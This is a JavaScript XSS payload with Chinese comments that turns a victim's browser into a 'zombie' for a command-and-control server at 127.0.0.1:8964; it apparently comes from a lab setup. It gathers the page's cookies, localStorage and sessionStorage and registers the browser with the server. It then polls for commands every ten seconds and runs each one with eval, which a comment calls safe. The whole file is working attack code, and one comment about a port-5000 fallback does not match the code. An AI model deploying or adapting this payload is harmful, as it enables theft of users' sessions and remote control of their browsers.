// XSS 載荷 - 建立與 C2 伺服器的連接
(function () {
    'use strict';

    // C2 伺服器配置
    const C2_SERVER = 'http://127.0.0.1:8964'; // 修正端口為 8964
    const REGISTER_URL = C2_SERVER + '/api/control/add_message';
    const COMMAND_URL = C2_SERVER + '/api/control/get_command';

    // 收集目標資訊
    const targetInfo = {
        ip: window.location.hostname,
        url: window.location.href,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString(),
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };

    console.log('[C2] 載荷已載入，目標資訊:', targetInfo);

    // 註冊殭屍機器到 C2 伺服器
    function registerZombie() {
        try {
            // 使用 FormData 格式，符合後端期望
            const formData = new FormData();
            formData.append('message', `殭屍機器上線: ${targetInfo.userAgent}`);
            formData.append('target_ip', targetInfo.ip);

            fetch(REGISTER_URL, {
                method: 'POST',
                body: formData,
                mode: 'cors'
            })
                .then(response => {
                    if (response.ok) {
                        console.log('[C2] 成功註冊到 C2 伺服器');
                        return response.json();
                    } else {
                        throw new Error('註冊失敗: ' + response.status);
                    }
                })
                .then(data => {
                    console.log('[C2] 註冊響應:', data);
                })
                .catch(error => {
                    console.error('[C2] 註冊錯誤:', error);
                    // 如果 5000 端口失敗，嘗試 8964
                    tryAlternativePort();
                });
        } catch (error) {
            console.error('[C2] 註冊異常:', error);
        }
    }

    // 嘗試替代端口
    function tryAlternativePort() {
        const altFormData = new FormData();
        altFormData.append('message', `殭屍機器上線 (alt port): ${targetInfo.userAgent}`);
        altFormData.append('target_ip', targetInfo.ip);

        fetch('http://127.0.0.1:8964/api/control/add_message', {
            method: 'POST',
            body: altFormData,
            mode: 'cors'
        })
            .then(response => {
                if (response.ok) {
                    console.log('[C2] 通過替代端口 8964 成功註冊');
                    // 更新 C2 伺服器配置為 8964
                    window.C2_SERVER = 'http://127.0.0.1:8964';
                }
            })
            .catch(error => {
                console.error('[C2] 替代端口也失敗:', error);
            });
    }

    // 獲取並執行命令
    function getCommand() {
        const currentServer = window.C2_SERVER || C2_SERVER;
        const cmdUrl = currentServer + '/api/control/get_command?zombie_ip=' + targetInfo.ip;

        fetch(cmdUrl, {
            method: 'GET',
            mode: 'cors'
        })
            .then(response => response.json())
            .then(data => {
                if (data.data && data.data !== '沒有命令') {
                    console.log('[C2] 收到命令:', data.data);
                    try {
                        // 安全執行命令
                        eval(data.data);
                    } catch (error) {
                        console.error('[C2] 命令執行錯誤:', error);
                    }
                }
            })
            .catch(error => {
                console.error('[C2] 獲取命令錯誤:', error);
            });
    }

    // 啟動載荷
    console.log('[C2] 載荷啟動中...');

    // 延遲 2 秒後註冊（避免頁面載入衝突）
    setTimeout(registerZombie, 2000);

    // 每 10 秒檢查一次命令
    setInterval(getCommand, 10000);

    // 也嘗試立即檢查命令
    setTimeout(getCommand, 5000);

    console.log('[C2] 載荷設置完成');
})();